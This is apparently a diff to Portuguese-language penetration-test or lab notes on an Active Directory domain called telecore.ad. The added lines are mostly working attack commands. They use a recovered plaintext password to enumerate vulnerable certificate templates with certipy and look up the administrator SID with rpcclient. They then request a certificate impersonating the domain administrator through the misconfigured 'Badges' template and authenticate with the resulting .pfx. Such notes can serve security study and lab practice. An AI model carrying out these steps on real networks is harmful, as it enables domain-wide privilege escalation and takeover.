@@ -160,3 +160,29 @@ PS C:\> $plaintextPassword
 T3l@Com#1
 #+end_src
 
+testando as credenciais com o certipy-ad -->
+#+begin_src sh
+certipy find -u 'tel_admin01@telecore.ad' -p 'T3l@Com#1' -dc-ip 10.5.2.2 -vulnerable -stdout -debug
+#+end_src
+com o certipy é possível verificar que o user tel_admin01 tem full control no template badges
+
+pegar o SID do tel_admin01 -->
+#+begin_src sh
+rpcclient --user 'telecore.ad/tel_admin01' --password 'T3l@Com#1' 10.5.2.2 -c "lookupnames administrator"
+
+administrator S-1-5-21-1588247407-410625039-1511794522-500
+#+end_src
+
+fazendo a request do template vuln -->
+#+begin_src sh
+certipy -debug req -u 'tel_admin01@telecore.ad' -p 'T3l@Com#1' -target 10.5.2.8 -ca 'telecore-PKI-SRV-CA' -template 'Badges' -upn 'administrator@telecore.ad' -sid 'administrator S-1-5-21-1588247407-410625039-1511794522-500'
+#+end_src
+
+após gerar o .pfx, -->
+#+begin_src sh
+certipy -debug auth -pfx administrator.pfx -dc-ip 10.5.2.2
+#+end_src
+
+
+
+
